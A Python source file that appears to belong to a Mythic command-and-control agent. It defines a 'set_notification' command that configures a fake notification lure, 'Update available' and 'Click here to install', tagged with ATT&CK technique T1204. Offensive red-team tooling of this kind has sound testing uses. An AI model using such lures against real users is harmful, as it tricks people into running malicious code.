from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterType,
    TaskArguments,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
)


class SetNotificationArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self._args = [
            CommandParameter(
                name="type",
                type=ParameterType.String,
                description="Notification type (basic or image)",
                default_value="basic",
                choices=["basic", "image"],
            ),
            CommandParameter(
                name="title",
                type=ParameterType.String,
                description="Notification title",
                default_value="Update available",
            ),
            CommandParameter(
                name="message",
                type=ParameterType.String,
                description="Notification body",
                default_value="A critical update is available. Click here to install.",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class SetNotificationCommand(CommandBase):
    cmd = "set_notification"
    needs_admin = False
    help_cmd = "set_notification [type] [title] [message]"
    description = "Configure the notification lure used by send_notification."
    version = 1
    author = "@Fir3n0x"
    attackmapping = ["T1204"]
    argument_class = SetNotificationArguments
    attributes = CommandAttributes(
        builtin=False,
        suggested_command=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
